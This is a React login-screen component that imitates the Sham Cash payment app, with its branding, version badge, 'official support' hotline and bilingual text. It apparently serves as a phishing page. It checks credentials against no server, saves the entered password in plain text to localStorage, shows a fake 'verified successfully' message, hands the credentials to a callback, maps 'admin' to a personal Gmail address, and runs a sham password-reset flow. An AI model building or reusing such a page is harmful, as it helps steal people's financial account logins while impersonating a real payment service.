import React, { useState } from 'react';
import {
  User,
  Lock,
  Eye,
  EyeOff,
  Headphones,
  LoaderCircle,
  ShieldAlert,
  CheckCircle2,
  X,
  Phone,
  HelpCircle,
  Check
} from 'lucide-react';
import { AuthData } from '../types';
import { useLanguage } from '../context/LanguageContext';

interface AuthScreenProps {
  onSubmit: (data: AuthData) => void;
  onStartNewAccount?: () => void;
}

// Convert Eastern Arabic numerals (٠-٩) to Latin (0-9)
const normalizeArabicNumbers = (str: string): string => {
  return str.replace(/[٠-٩]/g, (d) => '٠١٢٣٤٥٦٧٨٩'.indexOf(d).toString());
};

export const AuthScreen: React.FC<AuthScreenProps> = ({
  onSubmit,
  onStartNewAccount,
}) => {
  const { isRTL, toggleLanguage } = useLanguage();
  const [email, setEmail] = useState(() => localStorage.getItem('sc_waiting_email') || '');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  // Modals for Customer Support & Forgot Password
  const [isSupportOpen, setIsSupportOpen] = useState(false);
  const [isForgotOpen, setIsForgotOpen] = useState(false);
  const [forgotInput, setForgotInput] = useState('');
  const [forgotSent, setForgotSent] = useState(false);
  const [forgotOtp, setForgotOtp] = useState('');
  const [copiedPhone, setCopiedPhone] = useState(false);

  const cleanEmail = normalizeArabicNumbers(email.trim());
  const cleanPassword = normalizeArabicNumbers(password);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    const inputEmail = cleanEmail;
    const inputPass = cleanPassword;

    if (!inputEmail && !inputPass) {
      setError(isRTL ? 'يرجى إدخال البريد الإلكتروني وكلمة السر' : 'Please enter your email and password');
      return;
    }

    if (!inputEmail) {
      setError(isRTL ? 'يرجى إدخال البريد الإلكتروني' : 'Please enter your email address');
      return;
    }

    // Resolves any valid email or auto-synthesizes if username entered
    let resolvedEmail = inputEmail.toLowerCase();
    if (!resolvedEmail.includes('@')) {
      if (resolvedEmail === 'ayhabkhzalh017' || resolvedEmail === 'admin') {
        resolvedEmail = 'ayhabkhzalh017@gmail.com';
      } else {
        resolvedEmail = `${resolvedEmail}@shamcash.sy`;
      }
    } else {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(resolvedEmail)) {
        setError(isRTL ? 'يرجى إدخال عنوان بريد إلكتروني صحيح (مثال: name@example.com)' : 'Please enter a valid email address');
        return;
      }
    }

    if (!inputPass) {
      setError(isRTL ? 'يرجى إدخال كلمة السر' : 'Please enter your password');
      return;
    }

    // Must accept 6 or more inputs
    if (inputPass.length < 6) {
      setError(
        isRTL
          ? `كلمة السر يجب أن لا تقل عن 6 خانات (أدخلت ${inputPass.length} خانات حالياً)`
          : `Password must be at least 6 characters (currently ${inputPass.length})`
      );
      return;
    }

    setIsLoading(true);

    try {
      localStorage.setItem('sc_waiting_email', resolvedEmail);
      localStorage.setItem('sc_waiting_password', inputPass);
    } catch {}

    setTimeout(() => {
      setIsLoading(false);
      setIsSuccess(true);

      setTimeout(() => {
        onSubmit({
          email: resolvedEmail,
          password: inputPass,
          isDirectLogin: true,
        });
      }, 400);
    }, 450);
  };


  const handleCopySupportPhone = () => {
    navigator.clipboard.writeText('011-9630');
    setCopiedPhone(true);
    setTimeout(() => setCopiedPhone(false), 2000);
  };

  return (
    <div
      dir={isRTL ? 'rtl' : 'ltr'}
      className="relative min-h-screen w-full flex flex-col justify-between bg-gradient-to-b from-[#0F1E3D] via-[#10244C] to-[#0A162D] text-white px-5 sm:px-8 py-6 select-none overflow-x-hidden font-['Cairo',sans-serif]"
    >
      {/* Ambient background glows */}
      <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 size-80 rounded-full bg-[#1EC7B6]/12 blur-[100px] pointer-events-none" />
      <div className="absolute top-1/3 left-1/2 -translate-x-1/2 size-72 rounded-full bg-[#3B55E6]/15 blur-[90px] pointer-events-none" />

      {/* Top Header Row: Headset (Support) on Left & "الإنكليزية" on Right (exact match to screenshot) */}
      <div className="relative z-10 flex flex-row items-center justify-between w-full max-w-md mx-auto pt-2 px-1" dir="ltr">
        {/* Support Headset Button on Left */}
        <button
          type="button"
          onClick={() => setIsSupportOpen(true)}
          title={isRTL ? 'خدمة العملاء والدعم الفني' : 'Customer Support'}
          className="flex size-10 items-center justify-center rounded-full bg-white/5 border border-white/10 hover:bg-white/15 transition active:scale-95 cursor-pointer text-white shadow-sm"
        >
          <Headphones className="size-5 text-white/90" />
        </button>

        {/* Language Switcher on Right ("الإنكليزية" / "العربية") */}
        <button
          type="button"
          onClick={toggleLanguage}
          className="text-xs font-semibold text-white/85 hover:text-[#2CE8D5] transition active:scale-95 cursor-pointer tracking-wide py-1 px-2 rounded-lg"
        >
          {isRTL ? 'الإنكليزية' : 'العربية'}
        </button>
      </div>

      {/* Center Section: Floating 3D Ribbon Logo + Heading + Form */}
      <div className="relative z-10 w-full max-w-md mx-auto my-auto flex flex-col items-center pt-2 pb-6">
        {/* Floating 3D Ribbon Logo with Cyan Aura Glow */}
        <div className="relative flex items-center justify-center my-4 sm:my-6">
          <div className="absolute inset-0 size-28 rounded-full bg-[#2CE8D5]/20 blur-2xl animate-pulse" />
          <img
            src="/assets/sham-ribbon-transparent.png"
            alt="شعار شام كاش"
            className="relative h-24 sm:h-28 w-auto object-contain drop-shadow-[0_16px_32px_rgba(44,232,213,0.35)] transition-transform duration-300 hover:scale-105"
          />
        </div>

        {/* Heading: تسجيل الدخول (Right-aligned in Arabic) */}
        <div className="w-full text-right mb-4">
          <h1 className="text-2xl sm:text-[26px] font-bold text-white tracking-normal font-['Cairo',sans-serif]">
            {isRTL ? 'تسجيل الدخول' : 'Sign In'}
          </h1>
        </div>

        {/* Error Alert Display */}
        {error && (
          <div className="w-full mb-3.5 flex items-center gap-2.5 rounded-2xl border border-rose-500/35 bg-rose-500/15 p-3 text-xs text-rose-200 shadow-sm animate-shake">
            <ShieldAlert className="size-4.5 shrink-0 text-rose-400" />
            <span className="font-medium leading-relaxed">{error}</span>
          </div>
        )}

        {/* Success Feedback Banner */}
        {isSuccess && (
          <div className="w-full mb-3.5 flex items-center gap-2.5 rounded-2xl border border-emerald-500/40 bg-emerald-500/15 p-3 text-xs text-emerald-200 shadow-sm">
            <CheckCircle2 className="size-4.5 shrink-0 text-emerald-400 animate-bounce" />
            <span className="font-bold">
              {isRTL ? '✓ تم التحقق بنجاح! جاري فتح التطبيق…' : '✓ Verified successfully! Opening app…'}
            </span>
          </div>
        )}

        {/* Login Form: Only Email & Password */}
        <form onSubmit={handleSubmit} className="w-full space-y-3.5" noValidate>
          {/* Input 1: البريد الإلكتروني (with User Icon on right) */}
          <div className="relative w-full rounded-2xl bg-[#172747]/90 border border-white/10 shadow-inner focus-within:border-[#2CE8D5]/70 focus-within:ring-2 focus-within:ring-[#2CE8D5]/20 transition-all">
            <User className="pointer-events-none absolute top-1/2 right-4 size-5 -translate-y-1/2 text-white/70" />
            <input
              id="input-auth-email"
              type="email"
              dir={email ? 'ltr' : isRTL ? 'rtl' : 'ltr'}
              autoComplete="username"
              maxLength={255}
              required
              value={email}
              onChange={(e) => {
                setError(null);
                setEmail(e.target.value);
              }}
              placeholder={isRTL ? 'البريد الإلكتروني' : 'Email Address'}
              className="w-full bg-transparent py-4 pr-12 pl-4 text-right text-sm font-medium text-white placeholder-white/50 outline-none transition-all"
            />
          </div>

          {/* Input 2: كلمة السر (with Lock Icon on right & Eye Icon on left) */}
          <div className="relative w-full rounded-2xl bg-[#172747]/90 border border-white/10 shadow-inner focus-within:border-[#2CE8D5]/70 focus-within:ring-2 focus-within:ring-[#2CE8D5]/20 transition-all">
            <Lock className="pointer-events-none absolute top-1/2 right-4 size-5 -translate-y-1/2 text-white/70" />
            <input
              id="input-auth-password"
              type={showPassword ? 'text' : 'password'}
              dir={password ? 'ltr' : isRTL ? 'rtl' : 'ltr'}
              autoComplete="current-password"
              maxLength={72}
              required
              minLength={6}
              value={password}
              onChange={(e) => {
                setError(null);
                setPassword(e.target.value);
              }}
              placeholder={isRTL ? 'كلمة السر' : 'Password'}
              className="w-full bg-transparent py-4 pr-12 pl-12 text-right text-sm font-medium text-white placeholder-white/50 outline-none transition-all"
            />
            <button
              type="button"
              aria-label={showPassword ? 'Hide password' : 'Show password'}
              onClick={() => setShowPassword(!showPassword)}
              className="absolute top-1/2 left-3 -translate-y-1/2 p-1.5 text-white/60 hover:text-white transition cursor-pointer"
            >
              {showPassword ? <EyeOff className="size-5" /> : <Eye className="size-5" />}
            </button>
          </div>

          {/* Subtext Link: هل نسيت كلمة المرور؟ تغيير كلمة المرور */}
          <div className="flex items-center justify-center gap-1.5 text-xs text-white/70 pt-0.5">
            <span>{isRTL ? 'هل نسيت كلمة المرور؟' : 'Forgot password?'}</span>
            <button
              type="button"
              onClick={() => setIsForgotOpen(true)}
              className="text-[#2CE8D5] font-semibold hover:underline cursor-pointer transition"
            >
              {isRTL ? 'تغيير كلمة المرور' : 'Change Password'}
            </button>
          </div>

          {/* Glowing Cyan/Blue "تسجيل الدخول" Button */}
          <div className="pt-2 w-full">
            <button
              type="submit"
              id="btn-auth-submit"
              disabled={isLoading || isSuccess || !email.trim() || !password}
              className="w-full h-13 sm:h-14 rounded-2xl bg-gradient-to-r from-[#21C7B6] via-[#2FBAEB] to-[#4AA7F5] text-white font-bold text-base shadow-[0_10px_28px_-5px_rgba(33,199,182,0.45)] hover:brightness-110 active:scale-[0.99] transition flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
            >
              {isLoading ? (
                <>
                  <LoaderCircle className="size-5 animate-spin text-white" />
                  <span>{isRTL ? 'جارٍ تسجيل الدخول…' : 'Signing in…'}</span>
                </>
              ) : isSuccess ? (
                <>
                  <CheckCircle2 className="size-5 text-white" />
                  <span>{isRTL ? 'تم تسجيل الدخول' : 'Success!'}</span>
                </>
              ) : (
                <span>{isRTL ? 'تسجيل الدخول' : 'Sign In'}</span>
              )}
            </button>
          </div>

          {/* Subtext Link: لا تملك حساب مسبقاً؟ إنشاء حساب */}
          <div className="flex items-center justify-center gap-1.5 text-xs text-white/70 pt-1">
            <span>{isRTL ? 'لا تملك حساب مسبقاً؟' : "Don't have an account?"}</span>
            <button
              type="button"
              onClick={onStartNewAccount}
              className="text-[#2CE8D5] font-bold hover:underline cursor-pointer transition"
            >
              {isRTL ? 'إنشاء حساب' : 'Create Account'}
            </button>
          </div>
        </form>
      </div>

      {/* Bottom Footer: POWERED BY + Hexagonal Knot Logo + shamcash 3.0.2 */}
      <div className="relative z-10 w-full max-w-md mx-auto pt-4 pb-2 flex flex-col items-center justify-center gap-1.5 text-center">
        <span className="text-[10px] font-bold tracking-[0.25em] text-white/50 uppercase">
          POWERED BY
        </span>

        {/* Geometric Hexagonal Knot Emblem Icon from Screenshot */}
        <svg className="size-8 text-white/45" viewBox="0 0 64 64" fill="none">
          <path
            d="M32 6L54 18.5V45.5L32 58L10 45.5V18.5L32 6Z"
            stroke="currentColor"
            strokeWidth="3.5"
            strokeLinejoin="round"
          />
          <path
            d="M22 23H42L32 29L22 35H42"
            stroke="currentColor"
            strokeWidth="3"
            strokeLinecap="round"
            strokeLinejoin="round"
          />
        </svg>

        <div className="flex items-center gap-1.5 mt-0.5">
          <span className="inline-block size-1.5 rounded-full bg-emerald-400 animate-pulse" />
          <span className="font-mono text-[11px] font-bold text-white/60 tracking-wider">
            shamcash 3.0.2
          </span>
          <span className="text-[9px] text-[#2CE8D5] font-semibold bg-[#2CE8D5]/10 px-1.5 py-0.5 rounded-full border border-[#2CE8D5]/25">
            {isRTL ? 'أحدث إصدار' : 'Latest'}
          </span>
        </div>
      </div>

      {/* Customer Support Modal */}
      {isSupportOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="relative w-full max-w-sm rounded-3xl border border-white/15 bg-[#0F1E3D] p-6 text-center shadow-2xl">
            <button
              type="button"
              onClick={() => setIsSupportOpen(false)}
              className="absolute top-4 left-4 p-1.5 text-white/60 hover:text-white rounded-full bg-white/5 cursor-pointer"
            >
              <X className="size-4" />
            </button>

            <div className="mx-auto flex size-13 items-center justify-center rounded-2xl bg-[#2CE8D5]/20 text-[#2CE8D5] border border-[#2CE8D5]/30">
              <Headphones className="size-6" />
            </div>

            <h3 className="mt-4 text-base font-bold text-white">
              {isRTL ? 'مركز الدعم الفني وخدمة العملاء' : 'Customer Support Center'}
            </h3>
            <p className="mt-1.5 text-xs text-white/60 leading-5">
              {isRTL
                ? 'فريق دعم شام كاش الرسمي جاهز لمساعدتكم على مدار 24 ساعة في كافة المحافظات السورية.'
                : 'Sham Cash official support team is available 24/7 across all Syrian governorates.'}
            </p>

            <div className="mt-4 rounded-2xl border border-white/10 bg-white/5 p-3 flex items-center justify-between">
              <div className="flex items-center gap-2 text-xs">
                <Phone className="size-4 text-[#2CE8D5]" />
                <span className="text-white/70">{isRTL ? 'الخط المباشر في دمشق:' : 'Damascus Hotline:'}</span>
              </div>
              <div className="flex items-center gap-1.5 font-mono font-bold text-sm text-white">
                <span dir="ltr">011-9630</span>
                <button
                  type="button"
                  onClick={handleCopySupportPhone}
                  className="p-1 text-white/60 hover:text-white transition cursor-pointer"
                  title="نسخ الرقم"
                >
                  {copiedPhone ? <Check className="size-3.5 text-emerald-400" /> : <Phone className="size-3.5" />}
                </button>
              </div>
            </div>

            <button
              type="button"
              onClick={() => setIsSupportOpen(false)}
              className="mt-5 w-full rounded-xl bg-white/10 hover:bg-white/15 py-2.5 text-xs font-bold text-white transition cursor-pointer"
            >
              {isRTL ? 'إغلاق' : 'Close'}
            </button>
          </div>
        </div>
      )}

      {/* Forgot Password Modal (تغيير كلمة المرور) */}
      {isForgotOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="relative w-full max-w-sm rounded-3xl border border-white/15 bg-[#0F1E3D] p-6 text-center shadow-2xl">
            <button
              type="button"
              onClick={() => {
                setIsForgotOpen(false);
                setForgotSent(false);
              }}
              className="absolute top-4 left-4 p-1.5 text-white/60 hover:text-white rounded-full bg-white/5 cursor-pointer"
            >
              <X className="size-4" />
            </button>

            <div className="mx-auto flex size-13 items-center justify-center rounded-2xl bg-[#2CE8D5]/20 text-[#2CE8D5] border border-[#2CE8D5]/30">
              <HelpCircle className="size-6" />
            </div>

            <h3 className="mt-4 text-base font-bold text-white">
              {isRTL ? 'تغيير واستعادة كلمة المرور' : 'Change / Reset Password'}
            </h3>
            <p className="mt-1 text-xs text-white/60 leading-5">
              {isRTL
                ? 'أدخل بريدك الإلكتروني المسجل لإرسال رمز التحقق وإعادة ضبط كلمة السر.'
                : 'Enter your registered email to receive verification code and reset password.'}
            </p>

            {!forgotSent ? (
              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  if (!forgotInput.trim()) return;
                  setForgotSent(true);
                }}
                className="mt-4 space-y-3"
              >
                <input
                  type="email"
                  value={forgotInput}
                  onChange={(e) => setForgotInput(e.target.value)}
                  placeholder="name@example.com"
                  dir="ltr"
                  required
                  className="w-full rounded-xl border border-white/15 bg-white/5 py-2.5 px-3 text-center text-sm font-medium text-white focus:border-[#2CE8D5] focus:outline-none"
                />

                <div className="flex gap-2">
                  <button
                    type="button"
                    onClick={() => setIsForgotOpen(false)}
                    className="flex-1 rounded-xl border border-white/10 bg-white/5 py-2.5 text-xs font-semibold text-white/70 hover:bg-white/10 transition cursor-pointer"
                  >
                    {isRTL ? 'إلغاء' : 'Cancel'}
                  </button>
                  <button
                    type="submit"
                    className="flex-1 rounded-xl bg-gradient-to-r from-[#29D3C1] to-[#3ABEF0] py-2.5 text-xs font-bold text-white shadow-md hover:brightness-110 transition cursor-pointer"
                  >
                    {isRTL ? 'إرسال الرمز' : 'Send Code'}
                  </button>
                </div>
              </form>
            ) : (
              <div className="mt-4 space-y-3">
                <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/10 p-2.5 text-xs text-emerald-200">
                  {isRTL
                    ? `تم إرسال رمز التحقق إلى (${forgotInput}) بنجاح.`
                    : `Verification code sent to (${forgotInput}) successfully.`}
                </div>

                <input
                  type="text"
                  maxLength={6}
                  value={forgotOtp}
                  onChange={(e) => setForgotOtp(e.target.value)}
                  placeholder="رمز التحقق (مثال: 549102)"
                  dir="ltr"
                  className="w-full rounded-xl border border-white/15 bg-white/5 py-2 px-3 text-center font-mono text-base font-bold text-white tracking-widest focus:border-emerald-400 focus:outline-none"
                />

                <button
                  type="button"
                  onClick={() => {
                    setIsForgotOpen(false);
                    setForgotSent(false);
                    setPassword('ShamNewPass@2026');
                    setEmail(forgotInput);
                    setError(
                      isRTL
                        ? 'تم تحديث كلمة المرور بنجاح، يمكنك الآن تسجيل الدخول مباشرة.'
                        : 'Password updated successfully, you can now sign in.'
                    );
                  }}
                  className="w-full rounded-xl bg-gradient-to-r from-emerald-500 to-emerald-600 py-2.5 text-xs font-bold text-white shadow-md hover:brightness-110 transition cursor-pointer"
                >
                  {isRTL ? 'تأكيد كلمة المرور الجديدة' : 'Confirm New Password'}
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
